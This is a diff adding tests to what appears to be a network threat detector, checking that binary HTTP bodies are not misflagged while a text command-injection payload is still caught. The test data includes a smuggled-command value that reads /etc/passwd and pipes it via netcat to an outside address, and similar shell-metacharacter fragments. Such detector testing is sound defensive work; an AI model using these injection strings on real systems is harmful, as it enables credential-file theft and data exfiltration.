@@ -158,3 +158,35 @@ def test_config_defaults_only_list_implemented_detectors():
     assert set(cats) <= implemented
     for name, *_ in ThreatDetector._ADVANCED_DETECTORS:
         assert hasattr(ThreatDetector, ThreatDetector._ADVANCED_DETECTORS[[n for n, *_ in ThreatDetector._ADVANCED_DETECTORS].index(name)][1])
+
+
+WEB = {n: {'enabled': True} for n in ('sql_injection', 'xss', 'command_injection', 'path_traversal',
+                                      'xxe', 'ssrf', 'webshell')}
+WEB_TYPES = {'SQL_INJECTION_ATTEMPT', 'XSS_ATTEMPT', 'COMMAND_INJECTION_ATTEMPT', 'PATH_TRAVERSAL_ATTEMPT',
+             'XXE_ATTEMPT', 'SSRF_ATTEMPT', 'WEBSHELL_DETECTED'}
+
+
+def http_post(body, content_type, path='/inform', dport=8080, src='185.234.153.10'):
+    head = (f'POST {path} HTTP/1.1\r\nHost: unifi:{dport}\r\nUser-Agent: AirControl Agent v1.0\r\n'
+            f'Content-Type: {content_type}\r\nContent-Length: {len(body)}\r\n\r\n').encode()
+    return IP(bytes(IP(src=src, dst='10.100.0.4') / TCP(sport=51000, dport=dport, flags='PA') / Raw(head + body)))
+
+
+def test_unifi_inform_binary_body_ignored(clock):
+    d = make(WEB, cooldown=0)
+    for _ in range(30):
+        body = b'TNBU' + os.urandom(600) + b';|`$(%00../'
+        assert {t['type'] for t in adv(d, http_post(body, 'application/x-binary'))} & WEB_TYPES == set()
+
+
+def test_binary_body_without_content_type_ignored(clock):
+    d = make(WEB, cooldown=0)
+    body = bytes(range(256)) * 3 + b'; cat /etc/passwd'
+    assert {t['type'] for t in adv(d, http_post(body, 'application/whatever'))} & WEB_TYPES == set()
+
+
+def test_text_attack_still_detected(clock):
+    d = make(WEB, cooldown=0)
+    body = b'host=127.0.0.1; cat /etc/passwd | nc 1.2.3.4 9 && id'
+    types = {t['type'] for t in adv(d, http_post(body, 'application/x-www-form-urlencoded', path='/cgi-bin/ping'))}
+    assert 'COMMAND_INJECTION_ATTEMPT' in types
